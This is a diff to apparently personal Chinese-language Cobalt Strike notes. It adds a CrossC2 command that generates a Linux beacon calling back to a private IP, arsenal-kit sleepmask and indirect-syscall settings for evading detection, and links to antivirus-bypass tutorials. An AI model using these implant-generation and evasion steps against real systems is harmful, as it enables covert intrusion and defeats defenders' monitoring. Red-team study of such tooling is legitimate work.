@@ -4,6 +4,10 @@ https://github.com/k8gege/Aggressor/releases/tag/cs
 ## 环境配置
 插件加载信息保存在 `%userprofile%\.aggressor.prop`
 
+## 工具栏
+
+地球图标 | Web Share
+
 ## 常用命令
 
 ```sh
@@ -237,6 +241,7 @@ gcc -m32 test.c -fPIC -shared -o lib_rebind_testx86.so
 ./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
 ./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_testx86.so Linux x86 test
 ## 无 profile
+./genCrossC2.Linux 192.168.93.1 443 null null Linux x64 ./test
 ./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null Linux x64 ./test
 ./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null:config.ini Linux x64 t_cc2.out
 # bind shell
@@ -711,7 +716,15 @@ on ssh_initial {
     bsleep($1, 60);
 }
 ```
+### arsenal-kit
 
+```sh
+artifactkit_allocator="MapViewOfFile"
+sleepmask_version="49"
+sleepmask_syscalls_method="indirect_randomized"
+
+resource.rc 可以自定义
+```
 # Learning
 
 ## Step1
@@ -874,6 +887,7 @@ sub dialog_test {
 [内网神器Cobalt Strike隐藏特征与流量混淆.](https://mp.weixin.qq.com/s/TUldKUINcofoGZtRApMc0Q)
 
 [4.9 | 【第一部分】CobaltStrike v4.9 新功能尝鲜](https://www.bilibili.com/video/BV1pp4y1F7mt/)
+[CobaltStrike逆向学习系列(番外篇)-自定义RDI功能添加](https://mp.weixin.qq.com/s/k3n6gEU26EO7cvwT1mGoxA)
 
 
 ## 使用帮助
@@ -888,6 +902,7 @@ sub dialog_test {
 
 ## plugin
 
+[cs直接生成就360免杀?? 最新Artifact套件使用教程](https://www.bilibili.com/video/BV1yu4y1Y7Dp/) 
 [分享个 CobaltStrike 插件 Bypass 防护添加用户（附下载）](https://mp.weixin.qq.com/s/6nu1dwdvdtnP_6C-nIpMVg)
 [Cobalt-Strike 之 CrossC2 插件安装与 linux 上线](https://mp.weixin.qq.com/s/Fty2S9ettdtTFgJWVTvQNQ)
 [CobaltStrike 加载插件](https://mp.weixin.qq.com/s/NtxhTkuMGhhRyLUREnZQcA)
